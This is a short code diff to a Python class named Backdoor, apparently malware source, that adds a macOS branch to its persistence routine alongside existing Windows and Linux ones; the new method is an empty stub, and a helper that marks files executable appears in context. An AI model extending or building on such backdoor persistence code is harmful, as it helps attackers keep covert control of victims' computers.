@@ -103,6 +103,8 @@ class Backdoor:
             self.become_persistent_on_windows()
         elif sys.platform.startswith("linux"):
             self.become_persistent_on_linux()
+        else:
+            self.become_persistent_on_mac()
 
 
     def become_persistent_on_windows(self):
@@ -135,3 +137,6 @@ class Backdoor:
 
     def chmod_to_exec(self, file):
         os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)
+
+    def become_persistent_on_mac(self):
+        pass
